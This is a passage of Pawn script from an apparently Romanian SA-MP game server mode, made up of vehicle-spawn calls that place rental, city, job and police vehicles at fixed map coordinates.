	rentls[4] = AddStaticVehicleEx(579,543.0266,-1290.2795,17.0423,359.1650,-1,-1,900);
	rentls[5] = AddStaticVehicleEx(507,550.8103,-1290.6583,16.9736,0.7305,-1,-1,900);
	rentls[6] = AddStaticVehicleEx(565,557.6970,-1291.6086,16.8097,356.1449,-1,-1,900);
	rentls[7] = AddStaticVehicleEx(426,530.0093,-1278.4558,17.0165,307.7176,-1,-1,900);
	rentls[8] = AddStaticVehicleEx(565,537.4207,-1272.8118,16.8736,301.5176,-1,-1,900);
	rentls[9] = AddStaticVehicleEx(462,541.5830,-1268.1183,16.8337,185.9296,-1,-1,900);

	// RENT LAS VENTURAS
	rentlv[1] = AddStaticVehicleEx(568,2103.9756,1398.7379,10.6144,180.3386,-1,-1,900);
	rentlv[2] = AddStaticVehicleEx(568,2103.9231,1408.5211,10.6904,359.0508,-1,-1,900);
	rentlv[3] = AddStaticVehicleEx(558,2123.1621,1409.4192,10.3810,0.9785,-1,-1,900);
	rentlv[4] = AddStaticVehicleEx(555,2123.4253,1397.8079,10.5493,174.9472,-1,-1,900);
	rentlv[5] = AddStaticVehicleEx(526,2129.5029,1398.4174,10.5286,180.9738,-1,-1,900);
	rentlv[6] = AddStaticVehicleEx(533,2129.4924,1409.0605,10.5614,359.9803,-1,-1,900);
	rentlv[7] = AddStaticVehicleEx(506,2135.8508,1408.3748,10.4901,359.9999,-1,-1,900);
	rentlv[8] = AddStaticVehicleEx(504,2135.8455,1397.8976,10.6780,182.6301,-1,-1,900);
	rentlv[9] = AddStaticVehicleEx(496,2142.3674,1398.4742,10.5698,180.5331,-1,-1,900);
	rentlv[10] = AddStaticVehicleEx(500,2142.2983,1409.0153,10.9588,0.5355,-1,-1,900);
	rentlv[11] = AddStaticVehicleEx(603,2148.7930,1408.7021,10.5702,1.0529,-1,-1,900);
	rentlv[12] = AddStaticVehicleEx(602,2148.7444,1397.6796,10.5289,180.5844,-1,-1,900);
	rentlv[13] = AddStaticVehicleEx(469,2168.8721,1411.4260,10.8571,2.5797,-1,-1,900);
	rentlv[14] = AddStaticVehicleEx(522,2229.6904,1416.4528,10.6188,271.9706,-1,-1,900);
	rentlv[15] = AddStaticVehicleEx(522,2229.5618,1414.4696,10.6203,274.8182,-1,-1,900);
	rentlv[16] = AddStaticVehicleEx(522,2229.6228,1410.0747,10.6145,270.0645,-1,-1,900);
	rentlv[17] = AddStaticVehicleEx(522,2229.7847,1408.1317,10.6339,272.8406,-1,-1,900);
	rentlv[18] = AddStaticVehicleEx(471,2229.1997,1399.9491,10.4780,272.5312,-1,-1,900);
	rentlv[19] = AddStaticVehicleEx(471,2229.3074,1396.6508,10.4830,269.4410,-1,-1,900);

	// MASINI LOS SANTOS
	masinils[1] = AddStaticVehicleEx(509,1783.2937,-1865.9631,13.0817,359.8124,-1,-1,900);
	masinils[2] = AddStaticVehicleEx(509,1784.8997,-1865.8044,13.0765,1.7586,-1,-1,900);
	masinils[3] = AddStaticVehicleEx(510,1780.1306,-1865.9545,13.1799,1.8864,-1,-1,900);
	masinils[4] = AddStaticVehicleEx(510,1781.5242,-1865.8881,13.1744,3.2173,-1,-1,900);
	masinils[5] = AddStaticVehicleEx(509,1743.7513,-1862.5304,13.0886,1.5418,-1,-1,900);
	masinils[6] = AddStaticVehicleEx(509,1745.2994,-1862.5126,13.0868,0.2961,-1,-1,900);
	masinils[7] = AddStaticVehicleEx(510,1741.0520,-1862.5813,13.1841,1.3846,-1,-1,900);
	masinils[8] = AddStaticVehicleEx(510,1742.3751,-1862.5203,13.1723,3.4108,-1,-1,900);
	masinils[9] = AddStaticVehicleEx(509,1844.3652,-1860.6521,12.8948,89.6512,-1,-1,900);
	masinils[10] = AddStaticVehicleEx(462,1836.5415,-1853.2559,12.9819,181.4726,-1,-1,900);
	masinils[11] = AddStaticVehicleEx(462,1839.7932,-1853.2306,12.9849,181.8733,-1,-1,900);
	masinils[12] = AddStaticVehicleEx(462,1834.8175,-1870.7203,12.9870,358.9500,-1,-1,900);
	masinils[13] = AddStaticVehicleEx(462,1837.8599,-1870.9141,12.9858,1.0992,-1,-1,900);
	masinils[14] = AddStaticVehicleEx(462,1844.5757,-1871.3917,12.9879,359.4228,-1,-1,900);
	masinils[15] = AddStaticVehicleEx(543,1841.2858,-1871.0758,13.2091,359.5413,-1,-1,900);
	masinils[16] = AddStaticVehicleEx(462,1865.9194,-1865.7461,13.1635,90.6615,-1,-1,900);
	masinils[17] = AddStaticVehicleEx(462,1865.9814,-1863.9229,13.1739,88.5363,-1,-1,900);
	masinils[18] = AddStaticVehicleEx(462,1865.8817,-1867.2446,13.1513,92.4187,-1,-1,900);
	masinils[19] = AddStaticVehicleEx(462,1865.8787,-1868.8300,13.1392,91.9116,-1,-1,900);
	masinils[20] = AddStaticVehicleEx(462,1865.9330,-1870.2122,13.1271,96.1952,-1,-1,900);
	masinils[21] = AddStaticVehicleEx(462,1865.9503,-1871.8007,13.1156,91.7427,-1,-1,900);
	masinils[22] = AddStaticVehicleEx(554,2239.4929,-1630.6929,15.7426,337.0701,-1,-1,900);
	masinils[23] = AddStaticVehicleEx(401,2353.8459,-1753.9047,13.3007,271.9364,-1,-1,900);
	masinils[24] = AddStaticVehicleEx(468,2450.4280,-1795.9473,14.0615,352.5495,-1,-1,900);
	masinils[25] = AddStaticVehicleEx(462,2468.8054,-1755.4731,13.1419,270.6110,-1,-1,900);
	masinils[26] = AddStaticVehicleEx(418,2493.8740,-1755.0149,13.6076,0.2794,-1,-1,900);
	masinils[27] = AddStaticVehicleEx(565,2659.7168,-1841.2327,10.5634,207.2517,-1,-1,900);
	masinils[28] = AddStaticVehicleEx(481,2759.8044,-1875.5656,9.1931,178.6795,-1,-1,900);
	masinils[29] = AddStaticVehicleEx(500,2767.9380,-1875.5514,9.8829,2.9916,-1,-1,900);
	masinils[30] = AddStaticVehicleEx(489,2822.9365,-1723.4464,10.0821,79.3965,-1,-1,900);
	masinils[31] = AddStaticVehicleEx(581,2795.4543,-1549.5430,10.5166,266.9930,-1,-1,900);
	masinils[32] = AddStaticVehicleEx(542,2814.6096,-1458.0116,20.0059,185.7919,-1,-1,900);
	masinils[33] = AddStaticVehicleEx(468,2492.8010,-1298.0760,32.3194,266.7164,-1,-1,900);
	masinils[34] = AddStaticVehicleEx(509,2460.6155,-1277.1774,23.4640,358.4498,-1,-1,900);
	masinils[35] = AddStaticVehicleEx(474,2429.8032,-1223.0559,24.9496,177.4104,-1,-1,900);
	masinils[36] = AddStaticVehicleEx(566,2340.3086,-1316.7501,23.7525,179.7874,-1,-1,900);
	masinils[37] = AddStaticVehicleEx(542,2358.1445,-1360.4233,23.6566,92.5309,-1,-1,900);
	masinils[38] = AddStaticVehicleEx(510,2325.3838,-1508.6649,25.2981,92.4031,-1,-1,900);
	masinils[39] = AddStaticVehicleEx(510,2304.5283,-1521.7415,25.4735,182.3902,-1,-1,900);
	masinils[40] = AddStaticVehicleEx(510,2308.2480,-1545.9022,25.0090,239.4057,-1,-1,900);
	masinils[41] = AddStaticVehicleEx(521,2405.4219,-1535.6381,23.5651,1.1783,-1,-1,900);
	masinils[42] = AddStaticVehicleEx(602,2159.1257,-1805.2057,13.2685,89.9498,-1,-1,900);
	masinils[43] = AddStaticVehicleEx(509,2113.0210,-1728.2810,13.0466,246.8558,-1,-1,900);
	masinils[44] = AddStaticVehicleEx(478,2052.4978,-1904.2292,13.4583,359.6707,-1,-1,900);
	masinils[45] = AddStaticVehicleEx(475,1912.9283,-1873.7346,13.3916,1.2560,-1,-1,900);
	masinils[46] = AddStaticVehicleEx(481,1938.4325,-1985.7521,13.0371,4.8674,-1,-1,900);
	masinils[47] = AddStaticVehicleEx(491,1980.6752,-1995.6832,13.2307,1.0062,-1,-1,900);
	masinils[48] = AddStaticVehicleEx(555,1947.7363,-2114.0159,13.2772,87.1935,-1,-1,900);
	masinils[49] = AddStaticVehicleEx(558,1947.5328,-2123.6509,13.1192,88.5185,-1,-1,900);
	masinils[50] = AddStaticVehicleEx(534,1793.3336,-2149.0208,13.2714,180.3206,-1,-1,900);
	masinils[51] = AddStaticVehicleEx(535,1744.5975,-2136.2654,13.3383,179.2873,-1,-1,900);
	masinils[52] = AddStaticVehicleEx(482,1705.0177,-2129.6885,13.5570,178.1410,-1,-1,900);
	masinils[53] = AddStaticVehicleEx(536,1698.9929,-2093.8384,13.1678,358.9626,-1,-1,900);
	masinils[54] = AddStaticVehicleEx(567,1667.9752,-2113.2800,13.3059,88.6971,-1,-1,900);
	masinils[55] = AddStaticVehicleEx(578,1669.2623,-2165.0239,14.1183,87.0461,-1,-1,900);
	//masinils[56] = AddStaticVehicleEx(438,1518.7095,-2211.8906,13.6059,179.4284,-1,-1,900);
	masinils[57] = AddStaticVehicleEx(571,2285.4175,-2354.3469,12.7830,226.2505,-1,-1,900);
	masinils[58] = AddStaticVehicleEx(571,2289.0994,-2342.8228,12.8355,222.1870,-1,-1,900);
	masinils[59] = AddStaticVehicleEx(571,2292.5251,-2346.6611,12.8357,225.4696,-1,-1,900);
	masinils[60] = AddStaticVehicleEx(482,2528.1995,-2010.3619,13.5607,267.4615,-1,-1,900);
	masinils[61] = AddStaticVehicleEx(485,1953.8016,-2193.5457,13.1821,89.0116,-1,-1,900);
	masinils[62] = AddStaticVehicleEx(485,1940.8094,-2235.0728,13.1838,182.2761,-1,-1,900);
	masinils[63] = AddStaticVehicleEx(577,1932.8082,-2377.8477,13.4522,175.8586,-1,-1,900);
	masinils[64] = AddStaticVehicleEx(608,1936.4181,-2397.0518,14.0552,81.9305,-1,-1,900);
	masinils[65] = AddStaticVehicleEx(487,1973.0703,-2647.9475,13.7008,352.3174,-1,-1,900);
	masinils[66] = AddStaticVehicleEx(487,1955.4088,-2646.5007,13.6973,1.5214,-1,-1,900);
	masinils[67] = AddStaticVehicleEx(485,1963.7496,-2610.6018,13.1874,88.4399,-1,-1,900);
	masinils[68] = AddStaticVehicleEx(519,1890.3800,-2627.7698,14.4122,358.4205,-1,-1,900);
	masinils[69] = AddStaticVehicleEx(513,1822.2369,-2632.9529,14.0722,351.2814,-1,-1,900);
	masinils[70] = AddStaticVehicleEx(511,1684.1399,-2628.0200,14.8523,360.0000,-1,-1,900);
	masinils[71] = AddStaticVehicleEx(593,1615.9426,-2629.7314,13.9430,357.9850,-1,-1,900);
	masinils[72] = AddStaticVehicleEx(485,1652.3783,-2547.6809,13.1878,88.2834,-1,-1,900);
	masinils[73] = AddStaticVehicleEx(485,1655.0608,-2538.2200,13.1842,88.0360,-1,-1,900);
	masinils[74] = AddStaticVehicleEx(445,1837.1483,-1572.0918,13.3503,146.9127,-1,-1,900);
	masinils[75] = AddStaticVehicleEx(440,1362.0275,-1658.9196,13.4710,271.5900,-1,-1,900);
	masinils[76] = AddStaticVehicleEx(405,1339.4064,-1764.7444,13.4371,356.6715,-1,-1,900);
	masinils[77] = AddStaticVehicleEx(585,1281.3726,-1666.8911,13.1509,178.9866,-1,-1,900);
	masinils[78] = AddStaticVehicleEx(533,1226.3990,-1865.3936,13.1604,359.5092,-1,-1,900);
	masinils[84] = AddStaticVehicleEx(434,1785.6775,-1180.6459,23.7673,249.8715,-1,-1,900);
	masinils[85] = AddStaticVehicleEx(401,1555.7024,-1027.5682,23.7466,343.5457,-1,-1,900);
	masinils[86] = AddStaticVehicleEx(436,1331.1296,-1080.3518,24.9877,101.2256,-1,-1,900);
	masinils[87] = AddStaticVehicleEx(605,1278.4874,-939.9588,41.8950,274.1760,-1,-1,900);
	masinils[88] = AddStaticVehicleEx(405,980.1981,-914.9087,41.5209,184.1047,-1,-1,900);
	masinils[89] = AddStaticVehicleEx(400,589.4794,-1353.7014,14.4028,102.7391,-1,-1,900);
	masinils[90] = AddStaticVehicleEx(404,686.6794,-1413.1213,13.2275,91.5149,-1,-1,900);
	masinils[91] = AddStaticVehicleEx(437,599.1953,-1509.4843,15.3270,89.2659,-1,-1,900);
	masinils[92] = AddStaticVehicleEx(496,847.0896,-1503.0759,12.7671,177.1812,-1,-1,900);
	masinils[93] = AddStaticVehicleEx(496,720.9399,-1581.5565,14.0567,91.0754,-1,-1,900);
	masinils[94] = AddStaticVehicleEx(561,852.3123,-1363.9330,13.3108,180.6936,-1,-1,900);
	masinils[95] = AddStaticVehicleEx(404,1015.5672,-1358.8422,13.0208,273.6819,-1,-1,900);
	masinils[96] = AddStaticVehicleEx(509,766.0356,-1747.0859,12.0660,182.1092,-1,-1,900);
	masinils[97] = AddStaticVehicleEx(426,641.8690,-1704.4880,14.3627,348.5843,-1,-1,900);
	masinils[98] = AddStaticVehicleEx(509,539.3067,-1688.6719,18.3465,90.7645,-1,-1,900);
	masinils[99] = AddStaticVehicleEx(586,327.0353,-1473.3304,33.8680,131.2529,-1,-1,900);
	masinils[100] = AddStaticVehicleEx(509,247.4837,-1469.6525,23.2363,36.7312,-1,-1,900);
	masinils[101] = AddStaticVehicleEx(471,458.1586,-1779.6077,4.9527,357.5954,-1,-1,900);
	masinils[102] = AddStaticVehicleEx(457,478.6235,-1825.2671,5.0417,1.5500,-1,-1,900);
	masinils[103] = AddStaticVehicleEx(539,666.5036,-1879.7733,4.8200,272.2809,-1,-1,900);
	masinils[104] = AddStaticVehicleEx(566,334.0756,-1342.6429,14.1753,118.9580,-1,-1,900);
	masinils[105] = AddStaticVehicleEx(400,1185.1710,-925.1627,43.2723,277.7882,-1,-1,900);
	masinils[106] = AddStaticVehicleEx(568,1773.5421,-790.1965,62.9578,115.5337,-1,-1,900);
	masinils[107] = AddStaticVehicleEx(473,719.0027,-1636.4622,-0.1546,180.0970,-1,-1,900);
	masinils[108] = AddStaticVehicleEx(473,718.9659,-1627.7068,-0.1771,178.5294,-1,-1,900);
	masinils[109] = AddStaticVehicleEx(462,1559.6000000,-2325.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[110] = AddStaticVehicleEx(462,1559.5996000,-2338.2002000,13.2000000,90.0000000,53,106,15); //Faggio
	//masinils[111] = AddStaticVehicleEx(462,1559.5000000,-2308.8000000,13.2000000,90.0000000,53,106,15); //Faggio
	//masinils[112] = AddStaticVehicleEx(462,1559.5996000,-2312.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[113] = AddStaticVehicleEx(462,1559.5996000,-2316.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[114] = AddStaticVehicleEx(462,1559.5996000,-2319.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[115] = AddStaticVehicleEx(462,1559.5996000,-2329.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[116] = AddStaticVehicleEx(462,1559.5996000,-2335.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[117] = AddStaticVehicleEx(462,1559.6000000,-2322.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[118] = AddStaticVehicleEx(462,1559.5996000,-2332.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[119] = AddStaticVehicleEx(462,1559.5000000,-2234.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[120] =	AddStaticVehicleEx(462,1559.5000000,-2247.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[121] = AddStaticVehicleEx(462,1559.5000000,-2250.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[122] = AddStaticVehicleEx(462,1559.5000000,-2254.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[123] = AddStaticVehicleEx(462,1559.5000000,-2258.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[124] = AddStaticVehicleEx(462,1559.5000000,-2261.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	masinils[125] = AddStaticVehicleEx(462,1559.5000000,-2238.0000000,13.2000000,90.0000000,53,106,15); //Faggio
	new idv = 126;
	masinils[idv] = AddStaticVehicle(405,394.9306,-2043.9594,7.7239,90.3041,2,2),idv++; // masinaspawn1
	masinils[idv] = AddStaticVehicle(405,394.9812,-2039.5748,7.7239,90.2736,2,2),idv++; // masinaspawn2
	masinils[idv] = AddStaticVehicle(405,394.8696,-2034.7146,7.7850,90.1593,2,2),idv++; // masinaspawn3
	masinils[idv] = AddStaticVehicle(405,394.9744,-2029.9685,7.7850,89.0671,2,2),idv++; // masinaspawn4
	masinils[idv] = AddStaticVehicle(405,394.9174,-2025.2832,7.7394,89.8185,2,2),idv++; // masinaspawn5
	masinils[idv] = AddStaticVehicle(405,395.0220,-2020.7571,7.7387,88.7586,2,2),idv++; // masinaspawn6
	masinils[idv] = AddStaticVehicle(405,394.9241,-2016.4512,7.7394,90.1393,2,2),idv++; // masinaspawn7
	masinils[idv] = AddStaticVehicle(405,378.7922,-2016.2350,7.7394,270.7548,2,2),idv++; // masinaspawn8
	masinils[idv] = AddStaticVehicle(405,378.8925,-2020.5166,7.7394,269.4212,2,2),idv++; // masinaspawn9
	masinils[idv] = AddStaticVehicle(405,378.7825,-2038.8899,7.7374,270.8082,2,2),idv++; // masinaspawn10
	masinils[idv] = AddStaticVehicle(462,363.1073,-2045.7524,7.4952,89.6458,2,0),idv++; // motorspawn1
	masinils[idv] = AddStaticVehicle(462,363.0340,-2044.5524,7.4952,87.1234,2,0),idv++; // motorspawn2
	masinils[idv] = AddStaticVehicle(462,363.0699,-2042.8772,7.4952,89.4081,2,0),idv++; // motorspawn3
	masinils[idv] = AddStaticVehicle(462,363.1082,-2041.1533,7.4952,84.2276,2,0),idv++; // motorspawn4
	masinils[idv] = AddStaticVehicle(462,363.1141,-2039.7964,7.4953,86.5143,2,0),idv++; // motorspawn5
	masinils[idv] = AddStaticVehicle(462,363.0337,-2038.3544,7.4935,90.0550,2,0),idv++; // motorspawn6
	masinils[idv] = AddStaticVehicle(462,363.0683,-2036.7842,7.4973,90.3658,2,0),idv++; // motorspawn7
	masinils[idv] = AddStaticVehicle(462,363.1151,-2022.2926,7.4973,91.3180,2,0),idv++; // motorspawn8
	masinils[idv] = AddStaticVehicle(462,363.1058,-2020.8129,7.4939,95.7723,2,0),idv++; // motorspawn9
	masinils[idv] = AddStaticVehicle(462,363.2274,-2019.2429,7.4914,92.8078,2,0),idv++; // motorspawn10
	masinils[idv] = AddStaticVehicle(462,362.9578,-2017.4326,7.4927,101.1593,2,0),idv++; // motorspawn11
	masinils[idv] = AddStaticVehicle(462,363.0460,-2015.7593,7.4953,91.2244,2,0),idv++; // motorspawn12
	masinils[idv] = AddStaticVehicle(462,363.0491,-2014.1306,7.4954,90.8216,2,0),idv++; // motorspawn13
	masinils[idv] = AddStaticVehicle(462,357.1403,-2014.2101,7.4954,271.9720,2,0),idv++; // motorspawn14
	masinils[idv] = AddStaticVehicle(462,357.2601,-2015.8932,7.4954,269.4420,2,0),idv++; // motorspawn15
	masinils[idv] = AddStaticVehicle(462,357.3045,-2017.6809,7.4954,269.7700,2,0),idv++; // motorspawn16
	masinils[idv] = AddStaticVehicle(462,357.4036,-2019.2913,7.4974,271.4545,2,0),idv++; // motorspawn17
	masinils[idv] = AddStaticVehicle(462,357.3578,-2021.0114,7.4974,267.5494,2,0),idv++; // motorspawn18
	masinils[idv] = AddStaticVehicle(462,357.3665,-2022.6218,7.4975,267.1908,2,0),idv++; // motorspawn19
	masinils[idv] = AddStaticVehicle(462,357.2465,-2024.1379,7.4868,265.7065,2,0),idv++; // motorspawn20
	masinils[idv] = AddStaticVehicle(462,357.3186,-2038.1029,7.4975,271.9323,2,0),idv++; // motorspawn21
	masinils[idv] = AddStaticVehicle(462,357.2285,-2039.7466,7.4955,272.8972,2,0),idv++; // motorspawn22
	masinils[idv] = AddStaticVehicle(462,357.1544,-2041.2341,7.4955,271.2040,2,0),idv++; // motorspawn23
	masinils[idv] = AddStaticVehicle(462,357.1502,-2042.8369,7.4955,272.8297,2,0),idv++; // motorspawn24
	masinils[idv] = AddStaticVehicle(462,357.1685,-2044.2487,7.4956,270.0108,2,0),idv++; // motorspawn25
	masinils[idv] = AddStaticVehicle(462,357.0710,-2045.6125,7.4956,268.5718,2,0),idv++; // motorspawn26
	
	// MASINI LAS VENTURAS
	masinilv[1] = AddStaticVehicleEx(412,2294.5266,607.2626,10.5616,181.6389,-1,-1,900);
	masinilv[2] = AddStaticVehicleEx(516,2542.7034,1105.2786,10.6882,89.8527,-1,-1,900);
	masinilv[3] = AddStaticVehicleEx(600,2441.9583,1355.3241,10.4492,270.0162,-1,-1,900);
	masinilv[4] = AddStaticVehicleEx(474,2442.0383,1351.8097,10.6753,269.7997,-1,-1,900);
	masinilv[5] = AddStaticVehicleEx(479,2002.3301,1265.9167,10.6411,269.0797,-1,-1,900);
	masinilv[6] = AddStaticVehicleEx(475,2023.6683,1334.6910,10.2891,268.8487,-1,-1,900);
	masinilv[7] = AddStaticVehicleEx(576,2034.8480,1496.4730,10.3284,182.8958,-1,-1,900);
	masinilv[8] = AddStaticVehicleEx(419,2207.8843,1787.9150,10.5245,359.0755,-1,-1,900);
	masinilv[9] = AddStaticVehicleEx(475,2199.8208,1821.7456,10.5407,178.2771,-1,-1,900);
	masinilv[10] = AddStaticVehicleEx(518,2325.4458,1785.2665,10.5292,88.5952,-1,-1,900);
	masinilv[11] = AddStaticVehicleEx(505,2531.5671,1836.1420,10.9196,90.6484,-1,-1,900);
	masinilv[12] = AddStaticVehicleEx(422,2523.1885,2006.9279,10.8256,359.9110,-1,-1,900);
	masinilv[13] = AddStaticVehicleEx(504,2547.5505,2196.4114,10.5338,178.4619,-1,-1,900);
	masinilv[14] = AddStaticVehicleEx(500,1908.3857,2390.3782,10.9523,268.2330,-1,-1,900);
	masinilv[15] = AddStaticVehicleEx(508,1908.7340,2280.3271,11.2364,90.8790,-1,-1,900);
	masinilv[16] = AddStaticVehicleEx(414,1451.6176,1880.0594,10.9389,92.9936,-1,-1,900);
	masinilv[17] = AddStaticVehicleEx(487,1544.0031,1667.1586,10.9712,91.1780,-1,-1,900);
	masinilv[18] = AddStaticVehicleEx(592,1479.3081,1798.8142,12.0048,180.3739,-1,-1,900);
	masinilv[19] = AddStaticVehicleEx(512,1328.2946,1782.6364,11.0550,276.2125,-1,-1,900);
	masinilv[20] = AddStaticVehicleEx(487,1337.0222,1614.1442,10.9634,272.4750,-1,-1,900);
	masinilv[21] = AddStaticVehicleEx(487,1337.8754,1627.5682,10.9531,264.8815,-1,-1,900);
	masinilv[22] = AddStaticVehicleEx(519,1288.8821,1362.1863,11.7454,268.5226,-1,-1,900);
	masinilv[23] = AddStaticVehicleEx(512,1280.0664,1330.0198,11.0504,264.8200,-1,-1,900);
	masinilv[24] = AddStaticVehicleEx(513,1403.3567,1218.7445,11.3572,7.4674,-1,-1,900);
	masinilv[25] = AddStaticVehicleEx(593,1413.9852,1217.7208,11.2396,5.0484,-1,-1,900);
	masinilv[26] = AddStaticVehicleEx(511,1594.3536,1240.2802,12.1148,3.2613,-1,-1,900);
	masinilv[27] = AddStaticVehicleEx(511,1623.3300,1337.5297,12.1246,91.3682,-1,-1,900);
	masinilv[28] = AddStaticVehicleEx(540,1666.4838,1296.9968,10.7416,179.7498,-1,-1,900);
	masinilv[29] = AddStaticVehicleEx(479,1551.0135,1024.9342,10.5311,90.3137,-1,-1,900);
	masinilv[30] = AddStaticVehicleEx(412,1380.9448,1058.2960,10.7115,270.4498,-1,-1,900);
	masinilv[31] = AddStaticVehicleEx(467,1036.2561,1398.3359,5.4636,358.5266,-1,-1,900);
	masinilv[32] = AddStaticVehicleEx(473,1619.5319,593.0696,-0.3580,179.8772,-1,-1,900);
	masinilv[33] = AddStaticVehicleEx(473,1631.2913,573.0074,-0.3858,87.3583,-1,-1,900);
	masinilv[34] = AddStaticVehicleEx(473,1624.8490,573.0233,-0.2494,90.8698,-1,-1,900);
	masinilv[35] = AddStaticVehicleEx(473,1636.8927,594.0209,-0.2125,180.9997,-1,-1,900);
	masinilv[36] = AddStaticVehicleEx(473,2368.0398,519.7652,-0.3253,89.7492,-1,-1,900);
	masinilv[37] = AddStaticVehicleEx(452,2356.0701,519.5508,-0.3697,92.3875,-1,-1,900);
	masinilv[38] = AddStaticVehicleEx(452,2374.2830,539.1554,-0.4487,183.6588,-1,-1,900);
	masinilv[39] = AddStaticVehicleEx(473,2345.9858,540.7730,-0.1944,179.5087,-1,-1,900);

	// HITMAN CAR
	thea[1] = AddStaticVehicleEx(447,1044.2778,-358.9926,73.8239,92.9276,17,17,900);
	thea[2] = AddStaticVehicleEx(447,1043.9465,-352.5518,73.8239,94.0145,17,17,900);
	thea[3] = AddStaticVehicleEx(447,1043.7915,-345.8123,73.8239,91.3013,17,17,900);
	thea[4] = AddStaticVehicleEx(447,1015.2307,-346.2094,73.8238,266.1345,17,17,900);
	thea[5] = AddStaticVehicleEx(447,1015.4081,-339.5652,73.8238,267.5244,17,17,900);
	thea[6] = AddStaticVehicleEx(447,1015.6899,-331.5628,73.8238,267.2681,17,17,900);
	thea[7] = AddStaticVehicleEx(447,1015.9189,-323.9321,73.8238,269.7325,17,17,900);
	thea[8] = AddStaticVehicleEx(487,1099.0902,-349.0028,73.8203,2.3551,17,17,900);
	thea[9] = AddStaticVehicleEx(560,1096.2920,-308.6715,73.6979,88.1378,17,17,900);
	thea[10] = AddStaticVehicleEx(415,1096.7079,-304.3992,73.7647,89.3157,17,17,900);
	thea[11] = AddStaticVehicleEx(402,1082.1527,-295.0977,73.8244,179.7204,17,17,900);
	thea[12] = AddStaticVehicleEx(402,1069.2429,-295.2384,73.8166,179.8476,17,17,900);
	thea[13] = AddStaticVehicleEx(402,1075.8245,-295.1208,73.8172,180.8675,17,17,900);
	thea[14] = AddStaticVehicleEx(402,1063.8973,-295.1360,73.8166,179.2115,17,17,900);
	thea[15] = AddStaticVehicleEx(461,1085.9768,-294.8000,73.5772,152.3337,17,17,900);
	thea[16] = AddStaticVehicleEx(461,1059.6511,-294.8799,73.5647,199.7866,17,17,900);

	// SCHOOL INSTRUCTOR
	si[1] = AddStaticVehicleEx(462,2409.0469,1681.7623,10.6146,90.3537,137,137,900);
	si[2] = AddStaticVehicleEx(462,2409.0825,1680.2034,10.5967,89.9852,137,137,900);
	si[3] = AddStaticVehicleEx(462,2409.0369,1678.6389,10.6143,90.3697,137,137,900);
	si[4] = AddStaticVehicleEx(462,2409.1223,1677.2565,10.6232,94.1138,137,137,900);
	si[5] = AddStaticVehicleEx(547,2402.0417,1667.6302,10.5566,359.6569,137,137,900);
	si[6] = AddStaticVehicleEx(547,2408.5007,1667.6865,10.5588,359.2312,137,137,900);
	si[7] = AddStaticVehicleEx(445,2395.5488,1667.7886,10.6953,359.5206,137,137,900);
	si[8] = AddStaticVehicleEx(405,2389.2542,1667.7137,10.6953,358.1865,137,137,900);
	si[9] = AddStaticVehicleEx(405,2386.2317,1658.5924,10.6953,179.3917,137,137,900);
	si[10] = AddStaticVehicleEx(547,2398.9675,1658.9366,10.5556,181.0593,137,137,900);
	si[11] = AddStaticVehicleEx(547,2392.6196,1658.9342,10.5565,181.0413,137,137,900);
	si[12] = AddStaticVehicleEx(487,2407.9966,1647.0828,10.9999,179.8186,137,1,900);
	si[13] = AddStaticVehicleEx(487,2401.0283,1647.5598,10.9989,176.9126,137,1,900);


	// GARBAGE
    garbage[1] = AddStaticVehicleEx(408, 2586.3604, 2752.3716, 11.3258, -270.9001, 1,1,300);
    garbage[2] = AddStaticVehicleEx(408, 2586.0588, 2768.4138, 11.3258, -269.4001, 1,1,300);
    garbage[3] = AddStaticVehicleEx(408, 2585.6665, 2780.1948, 11.3258, -268.3199, 1,1,300);
    garbage[4] = AddStaticVehicleEx(408, 2540.9575, 2791.2749, 11.3258, -178.8601, 1,1,300);
    garbage[5] = AddStaticVehicleEx(408, 2549.4739, 2791.2957, 11.3258, -180.1801, 1,1,300);
    garbage[6] = AddStaticVehicleEx(408, 2557.7361, 2791.1021, 11.3258, -178.9200, 1,1,300);
    garbage[7] = AddStaticVehicleEx(408, 2565.9211, 2791.2678, 11.3258, -180.3600, 1,1,300);
    garbage[8] = AddStaticVehicleEx(408, 2574.2212, 2790.9065, 11.3258, -179.0400, 1,1,300);
    garbage[9] = AddStaticVehicleEx(408, 2586.6204, 2743.8894, 11.3258, -270.9001, 1,1,300);
    garbage[10] = AddStaticVehicleEx(408, 2586.3572, 2731.5381, 11.3258, -270.9001, 1,1,300);

	// LVPD Cars
    LVpdcar[1] = AddStaticVehicleEx(598,2296.4753,2428.8464,10.5423,180.2992,79,7,900);
	LVpdcar[2] = AddStaticVehicleEx(598,2282.6416,2429.1765,10.5434,178.1002,79,7,900);
	LVpdcar[3] = AddStaticVehicleEx(523,2274.7607,2424.8008,10.3911,182.5943,79,7,900);
	LVpdcar[4] = AddStaticVehicleEx(523,2272.7112,2424.6758,10.3868,180.8248,79,7,900);
	LVpdcar[5] = AddStaticVehicleEx(523,2276.5781,2424.8667,10.3900,182.6335,79,7,900);
	LVpdcar[6] = AddStaticVehicleEx(598,2282.5022,2477.2290,10.5411,180.0986,79,7,900);
	LVpdcar[7] = AddStaticVehicleEx(598,2273.3823,2477.2761,10.5422,179.9195,79,7,900);
	LVpdcar[8] = AddStaticVehicleEx(598,2255.9744,2477.1863,10.5418,180.0715,79,7,900);
	LVpdcar[9] = AddStaticVehicleEx(599,2282.2554,2442.7581,10.5406,0.4026,79,7,900);
	LVpdcar[10] = AddStaticVehicleEx(599,2273.5378,2442.8154,10.5418,2.4805,79,7,900);
	LVpdcar[11] = AddStaticVehicleEx(598,2255.6563,2443.0259,10.5415,1.8904,79,7,900);
	LVpdcar[12] = AddStaticVehicleEx(598,2315.1396,2460.4126,2.9944,92.6695,79,7,900);
	LVpdcar[13] = AddStaticVehicleEx(598,2314.9729,2465.5859,2.9963,89.8920,79,7,900);
